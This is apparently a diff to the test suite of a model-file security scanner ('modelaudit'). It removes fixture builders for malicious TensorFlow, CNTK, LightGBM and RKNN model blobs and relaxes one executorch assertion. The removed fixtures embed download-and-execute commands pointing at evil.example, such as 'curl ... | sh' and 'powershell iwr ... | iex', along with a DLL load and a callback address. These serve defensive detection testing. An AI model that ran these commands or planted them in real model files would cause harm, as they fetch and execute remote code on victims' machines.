@@ -314,82 +314,6 @@ def _write_safe_r_serialized(path: Path) -> None:
     path.write_bytes(b"X\nsafe\nmodel\nweights")
 
 
-def _build_malicious_tf_metagraph() -> bytes:
-    import modelaudit.protos  # noqa: F401
-
-    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
-    metagraph = meta_graph_pb2.MetaGraphDef()
-    metagraph.meta_info_def.meta_graph_version = "modelaudit_route_test"
-    node = metagraph.graph_def.node.add()
-    node.name = "pyfunc_node"
-    node.op = "PyFunc"
-    node.attr["func"].s = b"python -c 'import os; os.system(\"curl https://evil.example/x | sh\")'"
-    return cast(bytes, metagraph.SerializeToString())
-
-
-def _build_benign_tf_metagraph() -> bytes:
-    import modelaudit.protos  # noqa: F401
-
-    meta_graph_pb2 = importlib.import_module("tensorflow.core.protobuf.meta_graph_pb2")
-    metagraph = meta_graph_pb2.MetaGraphDef()
-    node = metagraph.graph_def.node.add()
-    node.name = "const_node"
-    node.op = "Const"
-    return cast(bytes, metagraph.SerializeToString())
-
-
-def _build_malicious_tf_savedmodel() -> bytes:
-    import modelaudit.protos  # noqa: F401
-
-    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
-    saved_model = saved_model_pb2.SavedModel()
-    saved_model.saved_model_schema_version = 1
-    metagraph = saved_model.meta_graphs.add()
-    node = metagraph.graph_def.node.add()
-    node.name = "pyfunc_node"
-    node.op = "PyFunc"
-    return cast(bytes, saved_model.SerializeToString())
-
-
-def _build_benign_tf_savedmodel() -> bytes:
-    import modelaudit.protos  # noqa: F401
-
-    saved_model_pb2 = importlib.import_module("tensorflow.core.protobuf.saved_model_pb2")
-    saved_model = saved_model_pb2.SavedModel()
-    saved_model.saved_model_schema_version = 1
-    node = saved_model.meta_graphs.add().graph_def.node.add()
-    node.name = "const_node"
-    node.op = "Const"
-    return cast(bytes, saved_model.SerializeToString())
-
-
-def _build_malicious_cntkv2() -> bytes:
-    prefix = b"\x08\x01\x12\x11\x0a\x07version\x12\x06\x08\x01\x10\x03(\x02\x12\x09\x0a\x03uid\x12\x02ab"
-    return (
-        prefix
-        + b" CompositeFunction primitive_functions native_user_function loadlibrary C:\\temp\\evil.dll "
-        + b"powershell -c iwr http://evil.example/p.ps1 | iex base64.b64decode("
-        + (b"A" * 96)
-        + b") exec(payload) "
-    )
-
-
-def _build_malicious_lightgbm() -> bytes:
-    return (
-        b"tree\nversion=v4\nnum_class=1\nnum_tree_per_iteration=1\nmax_feature_idx=2\n"
-        b"feature_names=f0 f1\ntree_sizes=12\nTree=0\nnum_leaves=2\nsplit_feature=0\n"
-        b"leaf_value=0.1 0.2\nmetadata=os.system('curl https://evil.example/p.sh | sh')\n"
-    )
-
-
-def _build_malicious_rknn() -> bytes:
-    return (
-        b"RKNN\x01\x00\x00\x00"
-        b"notes=cmd.exe /c curl https://evil.example/payload && powershell -enc AAAA\n"
-        b"callback=http://198.51.100.5:8080/collect\n"
-    )
-
-
 def _create_misnamed_zip(path: Path, entries: dict[str, bytes]) -> None:
     """Write a ZIP archive at an intentionally misleading file path."""
     with zipfile.ZipFile(path, "w") as archive:
@@ -3835,11 +3759,8 @@ def test_scan_file_routes_misnamed_executorch_archive_by_content(tmp_path: Path)
     result = scan_file(str(disguised_exec))
 
     assert result.scanner_name == "executorch"
-    assert any(
-        issue.rule_code == "S507" and issue.severity == IssueSeverity.CRITICAL and "evil.py" in (issue.location or "")
-        for issue in result.issues
-    )
-    assert not any(issue.rule_code == "S104" and "evil.py" in (issue.location or "") for issue in result.issues)
+    assert any(issue.rule_code == "S507" and "evil.py" in (issue.location or "") for issue in result.issues)
+    assert any(issue.rule_code == "S104" and "evil.py" in (issue.location or "") for issue in result.issues)
 
 
 def test_scan_file_does_not_route_non_pytorch_zip_with_generic_pickle(tmp_path: Path) -> None:
